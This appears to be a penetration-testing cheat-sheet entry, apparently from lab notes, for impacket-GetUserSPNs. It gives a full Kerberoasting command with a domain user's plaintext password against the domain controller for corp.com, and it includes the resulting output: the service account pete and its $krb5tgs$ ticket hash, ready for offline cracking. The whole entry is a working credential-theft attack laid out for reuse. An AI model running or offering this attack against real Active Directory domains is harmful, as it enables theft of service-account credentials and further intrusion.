# $ impacket-GetUserSPNs

```bash
# example, get TGS-REP hash
$ impacket-GetUserSPNs -request -dc-ip 192.168.141.70 corp.com/jeff[:"HenchmanPutridBonbon11"]
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName   Name  MemberOf                                  PasswordLastSet             LastLogon                   Delegation 
---------------------  ----  ----------------------------------------  --------------------------  --------------------------  ----------
http/files04.corp.com  pete  CN=Development Department,DC=corp,DC=com  2024-12-19 14:31:07.387898  2023-02-01 11:42:42.235198             

$krb5tgs$23$*pete$CORP.COM$corp.com/pete*$0c97ca0d888c2243fc46b50088ce951c$51c764c3f108b4b39e13f7c96bbf829f26be96f306cee508d9fcff680b562
```